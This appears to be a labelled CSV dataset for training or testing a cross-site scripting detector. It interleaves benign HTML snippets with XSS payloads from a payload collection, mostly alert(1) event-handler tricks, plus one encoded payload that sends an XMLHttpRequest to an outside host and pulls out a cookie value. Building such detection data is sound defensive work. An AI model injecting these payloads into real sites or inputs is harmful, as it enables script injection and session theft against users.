text,label,source,length,timestamp
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.397682
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.407992
"<output onmouseleave=""alert(1)"">test</output>",1,payloadbox,45,2026-03-01T13:13:37.390697
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.400996
"<isindex onkeydown=""alert(1)"" contenteditable>test</isindex>",1,payloadbox,60,2026-03-01T13:13:37.389686
<span class='class-104'>Services</span>,0,generated,39,2026-03-01T13:13:37.396686
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.412991
"<bgsound onmouseover=""alert(1)"">test</bgsound>",1,payloadbox,46,2026-03-01T13:13:37.386686
"<style>:target {color: red;}</style><frameset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frameset>",1,payloadbox,119,2026-03-01T13:13:37.392697
"<style>:target {transform: rotate(180deg);}</style><figcaption id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></figcaption>",1,payloadbox,138,2026-03-01T13:13:37.392697
"<head onbeforecopy=""alert(1)"" contenteditable>test</head>",1,payloadbox,57,2026-03-01T13:13:37.388686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.411988
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.399984
alert&#40;1&#41,1,payloadbox,15,2026-03-01T13:13:37.385678
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.398687
<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>,1,payloadbox,58,2026-03-01T13:13:37.391686
"<style>:target {transform: rotate(180deg);}</style><tbody id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tbody>",1,payloadbox,128,2026-03-01T13:13:37.392697
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.407992
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>,1,payloadbox,71,2026-03-01T13:13:37.386686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.409991
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.408990
"<div draggable=""true"" contenteditable>drag me</div><table ondrop=alert(1) contenteditable>drop here</table>",1,payloadbox,107,2026-03-01T13:13:37.387778
"<i oncontextmenu=""alert(1)"">test</i>",1,payloadbox,36,2026-03-01T13:13:37.389686
<span class='class-2064'>Services</span>,0,generated,40,2026-03-01T13:13:37.401989
"<style>:target {transform: rotate(180deg);}</style><dfn id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dfn>",1,payloadbox,124,2026-03-01T13:13:37.392697
"<isindex draggable=""true"" ondragenter=""alert(1)"">test</isindex>",1,payloadbox,63,2026-03-01T13:13:37.389686
"<b onmouseenter=""alert(1)"">test</b>",1,payloadbox,35,2026-03-01T13:13:37.385678
<svg><dfn onload=alert(1)></dfn>,1,payloadbox,32,2026-03-01T13:13:37.394683
"<object onmouseover=""alert(1)"">test</object>",1,payloadbox,44,2026-03-01T13:13:37.390697
"<summary onkeypress=""alert(1)"" contenteditable>test</summary>",1,payloadbox,61,2026-03-01T13:13:37.393697
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.415994
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.403996
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.405009
<samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>,1,payloadbox,66,2026-03-01T13:13:37.391686
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.397682
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.400996
<span class='class-6604'>Services</span>,0,generated,40,2026-03-01T13:13:37.415994
"<bdi onkeyup=""alert(1)"" contenteditable>test</bdi>",1,payloadbox,50,2026-03-01T13:13:37.386686
"<figcaption onbeforecopy=""alert(1)"" contenteditable>test</figcaption>",1,payloadbox,69,2026-03-01T13:13:37.388686
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.397682
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.403996
"<tbody onmousedown=""alert(1)"">test</tbody>",1,payloadbox,42,2026-03-01T13:13:37.394683
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondragover=alert(1) contenteditable>drop here</plaintext>",1,payloadbox,119,2026-03-01T13:13:37.387778
<p>About</p>,0,generated,12,2026-03-01T13:13:37.412991
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.414992
"<plaintext onmousedown=""alert(1)"">test</plaintext>",1,payloadbox,50,2026-03-01T13:13:37.391686
"<progress onmouseup=""alert(1)"">test</progress>",1,payloadbox,46,2026-03-01T13:13:37.391686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.399984
"<menuitem onmousemove=""alert(1)"">test</menuitem>",1,payloadbox,48,2026-03-01T13:13:37.390697
"<plaintext onmouseenter=""alert(1)"">test</plaintext>",1,payloadbox,51,2026-03-01T13:13:37.391686
<math><brute href=javascript:alert(1)>click,1,payloadbox,43,2026-03-01T13:13:37.385678
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.405991
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.403996
"<iframe onkeyup=""alert(1)"" contenteditable>test</iframe>",1,payloadbox,56,2026-03-01T13:13:37.389686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.398687
"<style>@keyframes x{}</style><span style=""animation-name:x"" onanimationstart=""alert(1)""></span>",1,payloadbox,95,2026-03-01T13:13:37.393697
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>,1,payloadbox,497,2026-03-01T13:13:37.395688
<span class='class-5214'>Services</span>,0,generated,40,2026-03-01T13:13:37.411988
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,1,payloadbox,55,2026-03-01T13:13:37.395688
"<pre onmouseup=""alert(1)"">test</pre>",1,payloadbox,36,2026-03-01T13:13:37.391686
<span class='class-1624'>Services</span>,0,generated,40,2026-03-01T13:13:37.400996
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.409991
"<frameset draggable=""true"" ondragenter=""alert(1)"">test</frameset>",1,payloadbox,65,2026-03-01T13:13:37.388686
<figcaption id=x tabindex=1 onfocusin=alert(1)></figcaption>,1,payloadbox,60,2026-03-01T13:13:37.388686
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.403007
<p>About</p>,0,generated,12,2026-03-01T13:13:37.410992
<input type=checkbox id=x onfocus=alert(1)>,1,payloadbox,43,2026-03-01T13:13:37.389686
"<embed onkeyup=""alert(1)"" contenteditable>test</embed>",1,payloadbox,54,2026-03-01T13:13:37.388686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.412991
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.401989
"<kbd oncontextmenu=""alert(1)"">test</kbd>",1,payloadbox,40,2026-03-01T13:13:37.389686
"<strong onkeydown=""alert(1)"" contenteditable>test</strong>",1,payloadbox,58,2026-03-01T13:13:37.392697
<spacer id=x tabindex=1 onfocusin=alert(1)></spacer>,1,payloadbox,52,2026-03-01T13:13:37.392697
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.400996
"<data oncontextmenu=""alert(1)"">test</data>",1,payloadbox,42,2026-03-01T13:13:37.387778
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.401989
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.414992
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.411988
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.406989
<p>About</p>,0,generated,12,2026-03-01T13:13:37.408990
<p>About</p>,0,generated,12,2026-03-01T13:13:37.401989
"<canvas onbeforecopy=""alert(1)"" contenteditable>test</canvas>",1,payloadbox,61,2026-03-01T13:13:37.386686
"<div draggable=""true"" contenteditable>drag me</div><header ondragover=alert(1) contenteditable>drop here</header>",1,payloadbox,113,2026-03-01T13:13:37.387778
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.403007
"<! foo=""><script>alert(91)</script>"">",1,payloadbox,37,2026-03-01T13:13:37.396686
"<input draggable=""true"" ondragenter=""alert(1)"">test</input>",1,payloadbox,59,2026-03-01T13:13:37.389686
"<style>@keyframes x{}</style><applet style=""animation-name:x"" onanimationstart=""alert(1)""></applet>",1,payloadbox,99,2026-03-01T13:13:37.393697
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><em id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></em>",1,payloadbox,174,2026-03-01T13:13:37.393697
<em id=x tabindex=1 onfocus=alert(1)></em>,1,payloadbox,42,2026-03-01T13:13:37.388686
"<html draggable=""true"" ondragleave=""alert(1)"">test</html>",1,payloadbox,57,2026-03-01T13:13:37.389686
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.403007
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.398687
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.413993
"<abbr onbeforecopy=""alert(1)"" contenteditable>test</abbr>",1,payloadbox,57,2026-03-01T13:13:37.385678
"<content onmouseleave=""alert(1)"">test</content>",1,payloadbox,47,2026-03-01T13:13:37.387778
<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>,1,payloadbox,81,2026-03-01T13:13:37.395688
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.410992
<th id=x tabindex=1 onbeforeactivate=alert(1)></th>,1,payloadbox,51,2026-03-01T13:13:37.394683
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.410992
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.405009
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.406989
"<div draggable=""true"" contenteditable>drag me</div><s ondragover=alert(1) contenteditable>drop here</s>",1,payloadbox,103,2026-03-01T13:13:37.387778
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.397682
"<style>@keyframes slidein {}</style><table style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></table>",1,payloadbox,164,2026-03-01T13:13:37.393697
"<base onmousedown=""alert(1)"">test</base>",1,payloadbox,40,2026-03-01T13:13:37.385678
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.401989
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.406989
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.399984
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.400996
<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>,1,payloadbox,52,2026-03-01T13:13:37.388686
<span class='class-1264'>Services</span>,0,generated,40,2026-03-01T13:13:37.399984
"<keygen onmousemove=""alert(1)"">test</keygen>",1,payloadbox,44,2026-03-01T13:13:37.389686
"<rp onclick=""alert(1)"">test</rp>",1,payloadbox,32,2026-03-01T13:13:37.391686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.410992
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.403996
"<bdo oncut=""alert(1)"" contenteditable>test</bdo>",1,payloadbox,48,2026-03-01T13:13:37.386686
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.405991
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.415994
"<noframes onmousedown=""alert(1)"">test</noframes>",1,payloadbox,48,2026-03-01T13:13:37.390697
<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>,1,payloadbox,56,2026-03-01T13:13:37.391686
"<frame oncut=""alert(1)"" contenteditable>test</frame>",1,payloadbox,52,2026-03-01T13:13:37.388686
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.398687
<th id=x tabindex=1 onfocus=alert(1)></th>,1,payloadbox,42,2026-03-01T13:13:37.394683
"<style>:target {color:red;}</style><figcaption id=x style=""transition:color 1s"" ontransitionend=alert(1)></figcaption>",1,payloadbox,118,2026-03-01T13:13:37.392697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.403007
"<br draggable=""true"" ondrag=""alert(1)"">test</br>",1,payloadbox,48,2026-03-01T13:13:37.386686
<span class='class-3734'>Services</span>,0,generated,40,2026-03-01T13:13:37.406989
"<i onmouseup=""alert(1)"">test</i>",1,payloadbox,32,2026-03-01T13:13:37.389686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.405009
"<dd draggable=""true"" ondragend=""alert(1)"">test</dd>",1,payloadbox,51,2026-03-01T13:13:37.387778
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.403007
<span class='class-6154'>Services</span>,0,generated,40,2026-03-01T13:13:37.414992
<span class='class-3014'>Services</span>,0,generated,40,2026-03-01T13:13:37.405009
"<nav onclick=""alert(1)"">test</nav>",1,payloadbox,34,2026-03-01T13:13:37.390697
"<html ondblclick=""alert(1)"">test</html>",1,payloadbox,39,2026-03-01T13:13:37.389686
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hr>",1,payloadbox,174,2026-03-01T13:13:37.393697
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.400996
<span class='class-1724'>Services</span>,0,generated,40,2026-03-01T13:13:37.400996
"<content oncontextmenu=""alert(1)"">test</content>",1,payloadbox,48,2026-03-01T13:13:37.387778
<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>,1,payloadbox,64,2026-03-01T13:13:37.386686
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.410992
"<summary oncontextmenu=""alert(1)"">test</summary>",1,payloadbox,48,2026-03-01T13:13:37.393697
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.409991
<span class='class-1924'>Services</span>,0,generated,40,2026-03-01T13:13:37.401989
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.415994
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.405991
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.396686
"<main onbeforecut=""alert(1)"" contenteditable>test</main>",1,payloadbox,56,2026-03-01T13:13:37.389686
<span class='class-4084'>Services</span>,0,generated,40,2026-03-01T13:13:37.408990
"<bdi onmouseenter=""alert(1)"">test</bdi>",1,payloadbox,39,2026-03-01T13:13:37.386686
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.399984
<em id=x tabindex=1 onbeforedeactivate=alert(1)></em><input autofocus>,1,payloadbox,70,2026-03-01T13:13:37.388686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.398687
"<multicol oncontextmenu=""alert(1)"">test</multicol>",1,payloadbox,50,2026-03-01T13:13:37.390697
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.405991
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.415994
"<div draggable=""true"" contenteditable>drag me</div><th ondragover=alert(1) contenteditable>drop here</th>",1,payloadbox,105,2026-03-01T13:13:37.388686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.397682
<p>About</p>,0,generated,12,2026-03-01T13:13:37.415994
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.401989
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.415994
"<label onmouseout=""alert(1)"">test</label>",1,payloadbox,41,2026-03-01T13:13:37.389686
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.399984
<%78 onxxx=1,1,payloadbox,12,2026-03-01T13:13:37.385678
<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>,1,payloadbox,66,2026-03-01T13:13:37.387778
"<tbody onmouseleave=""alert(1)"">test</tbody>",1,payloadbox,43,2026-03-01T13:13:37.394683
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.407992
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.403007
"<body onmouseleave=""alert(1)"">test</body>",1,payloadbox,41,2026-03-01T13:13:37.386686
<multicol id=x tabindex=1 onactivate=alert(1)></multicol>,1,payloadbox,57,2026-03-01T13:13:37.390697
<span class='class-2504'>Services</span>,0,generated,40,2026-03-01T13:13:37.403996
"<div draggable=""true"" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>",1,payloadbox,113,2026-03-01T13:13:37.387778
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.414992
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.414992
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.403996
<keygen onblur=alert(1) tabindex=1 id=x></keygen><input autofocus>,1,payloadbox,66,2026-03-01T13:13:37.389686
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.405009
"<style>@keyframes x{}</style><frame style=""animation-name:x"" onanimationstart=""alert(1)""></frame>",1,payloadbox,97,2026-03-01T13:13:37.393697
<keygen id=x tabindex=1 onactivate=alert(1)></keygen>,1,payloadbox,53,2026-03-01T13:13:37.389686
<span class='class-1674'>Services</span>,0,generated,40,2026-03-01T13:13:37.400996
"<object onbeforepaste=""alert(1)"" contenteditable>test</object>",1,payloadbox,62,2026-03-01T13:13:37.390697
<p>About</p>,0,generated,12,2026-03-01T13:13:37.405991
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationstart=""alert(1)""></element>",1,payloadbox,101,2026-03-01T13:13:37.393697
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.408990
<col id=x tabindex=1 onfocusin=alert(1)></col>,1,payloadbox,46,2026-03-01T13:13:37.386686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.408990
"<shadow draggable=""true"" ondragleave=""alert(1)"">test</shadow>",1,payloadbox,61,2026-03-01T13:13:37.391686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.410992
"<time ondblclick=""alert(1)"">test</time>",1,payloadbox,39,2026-03-01T13:13:37.394683
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.415994
"<legend onclick=""alert(1)"">test</legend>",1,payloadbox,40,2026-03-01T13:13:37.389686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.398687
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.413993
"<p onpaste=""alert(1)"" contenteditable>test</p>",1,payloadbox,46,2026-03-01T13:13:37.390697
<p>About</p>,0,generated,12,2026-03-01T13:13:37.407992
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.400996
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.401989
<output onblur=alert(1) tabindex=1 id=x></output><input autofocus>,1,payloadbox,66,2026-03-01T13:13:37.390697
"<noembed ondblclick=""alert(1)"">test</noembed>",1,payloadbox,45,2026-03-01T13:13:37.390697
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.409991
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.401989
<span class='class-3544'>Services</span>,0,generated,40,2026-03-01T13:13:37.406989
<span class='class-4724'>Services</span>,0,generated,40,2026-03-01T13:13:37.410992
"<tr onmouseup=""alert(1)"">test</tr>",1,payloadbox,34,2026-03-01T13:13:37.394683
<p>About</p>,0,generated,12,2026-03-01T13:13:37.405009
<svg><small onload=alert(1)></small>,1,payloadbox,36,2026-03-01T13:13:37.394683
"<dialog onkeyup=""alert(1)"" contenteditable>test</dialog>",1,payloadbox,56,2026-03-01T13:13:37.387778
"<div draggable=""true"" contenteditable>drag me</div><content ondragover=alert(1) contenteditable>drop here</content>",1,payloadbox,115,2026-03-01T13:13:37.387778
<p>About</p>,0,generated,12,2026-03-01T13:13:37.403996
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.403996
<script id=x tabindex=1 onfocus=alert(1)></script>,1,payloadbox,50,2026-03-01T13:13:37.391686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.407992
"<pre onmousemove=""alert(1)"">test</pre>",1,payloadbox,38,2026-03-01T13:13:37.391686
"<img draggable=""true"" ondragenter=""alert(1)"">test</img>",1,payloadbox,55,2026-03-01T13:13:37.389686
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.403996
"<li onmouseup=""alert(1)"">test</li>",1,payloadbox,34,2026-03-01T13:13:37.389686
<form action=javascript:alert(1)><input type=submit>,1,payloadbox,52,2026-03-01T13:13:37.385678
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.411988
"<p draggable=""true"" ondrag=""alert(1)"">test</p>",1,payloadbox,46,2026-03-01T13:13:37.390697
"<area onpaste=""alert(1)"" contenteditable>test</area>",1,payloadbox,52,2026-03-01T13:13:37.385678
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.408990
<p>About</p>,0,generated,12,2026-03-01T13:13:37.410992
<span class='class-754'>Services</span>,0,generated,39,2026-03-01T13:13:37.398687
"<svg onmousemove=""alert(1)"">test</svg>",1,payloadbox,38,2026-03-01T13:13:37.394683
"<div draggable=""true"" contenteditable>drag me</div><param ondragover=alert(1) contenteditable>drop here</param>",1,payloadbox,111,2026-03-01T13:13:37.387778
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.403007
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.410992
<caption id=x tabindex=1 onbeforeactivate=alert(1)></caption>,1,payloadbox,61,2026-03-01T13:13:37.386686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.397682
<span class='class-4684'>Services</span>,0,generated,40,2026-03-01T13:13:37.410992
"<div draggable=""true"" contenteditable>drag me</div><img ondrop=alert(1) contenteditable>drop here</img>",1,payloadbox,103,2026-03-01T13:13:37.387778
"<figcaption draggable=""true"" ondragenter=""alert(1)"">test</figcaption>",1,payloadbox,69,2026-03-01T13:13:37.388686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.412991
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.405991
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.400996
"<multicol draggable=""true"" ondragleave=""alert(1)"">test</multicol>",1,payloadbox,65,2026-03-01T13:13:37.390697
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.398687
"<embed oncopy=""alert(1)"" contenteditable>test</embed>",1,payloadbox,53,2026-03-01T13:13:37.388686
<body onhashchange=alert(1)><a href=#x>click this!#x,1,payloadbox,52,2026-03-01T13:13:37.385678
"<b onmouseout=""alert(1)"">test</b>",1,payloadbox,33,2026-03-01T13:13:37.385678
<p>About</p>,0,generated,12,2026-03-01T13:13:37.401989
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.407992
"<style onmouseup=""alert(1)"">test</style>",1,payloadbox,40,2026-03-01T13:13:37.392697
<span class='class-2544'>Services</span>,0,generated,40,2026-03-01T13:13:37.403996
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.410992
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.400996
"<wbr onmousemove=""alert(1)"">test</wbr>",1,payloadbox,38,2026-03-01T13:13:37.395688
<span class='class-4384'>Services</span>,0,generated,40,2026-03-01T13:13:37.409991
"<datalist onkeypress=""alert(1)"" contenteditable>test</datalist>",1,payloadbox,63,2026-03-01T13:13:37.387778
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.401989
"<map onmouseout=""alert(1)"">test</map>",1,payloadbox,37,2026-03-01T13:13:37.389686
"<style>@keyframes slidein {}</style><marquee style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></marquee>",1,payloadbox,168,2026-03-01T13:13:37.393697
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.414992
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.413993
"<frameset ondblclick=""alert(1)"">test</frameset>",1,payloadbox,47,2026-03-01T13:13:37.388686
<output id=x tabindex=1 onbeforeactivate=alert(1)></output>,1,payloadbox,59,2026-03-01T13:13:37.390697
"<thead ondblclick=""alert(1)"">test</thead>",1,payloadbox,41,2026-03-01T13:13:37.394683
<span class='class-3144'>Services</span>,0,generated,40,2026-03-01T13:13:37.405009
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.399984
"<style>@keyframes x{}</style><base style=""animation-name:x"" onanimationend=""alert(1)""></base>",1,payloadbox,93,2026-03-01T13:13:37.393697
"<title draggable=""true"" ondragstart=""alert(1)"">test</title>",1,payloadbox,59,2026-03-01T13:13:37.394683
<p>About</p>,0,generated,12,2026-03-01T13:13:37.411988
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.405009
<nav id=x tabindex=1 onbeforeactivate=alert(1)></nav>,1,payloadbox,53,2026-03-01T13:13:37.390697
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.407992
"<template onmouseenter=""alert(1)"">test</template>",1,payloadbox,49,2026-03-01T13:13:37.394683
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.398687
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.411988
<p>About</p>,0,generated,12,2026-03-01T13:13:37.413993
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.398687
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.410992
<svg><caption onload=alert(1)></caption>,1,payloadbox,40,2026-03-01T13:13:37.394683
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.412991
"<head onmouseover=""alert(1)"">test</head>",1,payloadbox,40,2026-03-01T13:13:37.388686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.401989
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.413993
"<dd draggable=""true"" ondrag=""alert(1)"">test</dd>",1,payloadbox,48,2026-03-01T13:13:37.387778
%3Cx onxxx=alert(1),1,payloadbox,19,2026-03-01T13:13:37.385678
<code id=x tabindex=1 onbeforedeactivate=alert(1)></code><input autofocus>,1,payloadbox,74,2026-03-01T13:13:37.386686
<span class='class-4104'>Services</span>,0,generated,40,2026-03-01T13:13:37.408990
"<picture oncontextmenu=""alert(1)"">test</picture>",1,payloadbox,48,2026-03-01T13:13:37.391686
"<div draggable=""true"" contenteditable>drag me</div><pre ondragover=alert(1) contenteditable>drop here</pre>",1,payloadbox,107,2026-03-01T13:13:37.387778
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.401989
"<wbr onbeforecopy=""alert(1)"" contenteditable>test</wbr>",1,payloadbox,55,2026-03-01T13:13:37.395688
"<menu onpaste=""alert(1)"" contenteditable>test</menu>",1,payloadbox,52,2026-03-01T13:13:37.390697
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.397682
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.414992
"<div draggable=""true"" contenteditable>drag me</div><rb ondragover=alert(1) contenteditable>drop here</rb>",1,payloadbox,105,2026-03-01T13:13:37.387778
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.401989
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.398687
<span class='class-4674'>Services</span>,0,generated,40,2026-03-01T13:13:37.410992
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.400996
